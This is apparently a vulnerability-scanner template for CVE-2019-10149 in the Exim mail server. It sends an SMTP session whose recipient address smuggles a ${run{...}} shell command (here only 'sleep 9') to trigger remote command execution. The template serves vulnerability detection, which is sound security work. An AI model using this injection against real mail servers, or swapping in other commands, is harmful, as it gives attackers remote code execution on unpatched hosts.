id: CVE-2019-10149

info:
  name: Exim Remote Command Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: A flaw was found in Exim versions 4.87 to 4.91 (inclusive). Improper validation of recipient address in deliver_message() function in /src/deliver.c may lead to remote command execution.

network:
  - inputs:
      - data: "EHLO victim.com
MAIL FROM:<>
RCPT TO:<${run{\\x2Fbin\\x2Fsh\\t-c\\t\\x22sleep\\x209\\x22}}@victim.com>
DATA
Subject: Test
Test mail.
.
QUIT
"
    host:
      - "{{Hostname}}"
    port: 25
    read-size: 1024

    matchers:
      - type: word
        words:
          - "250 OK"
        part: data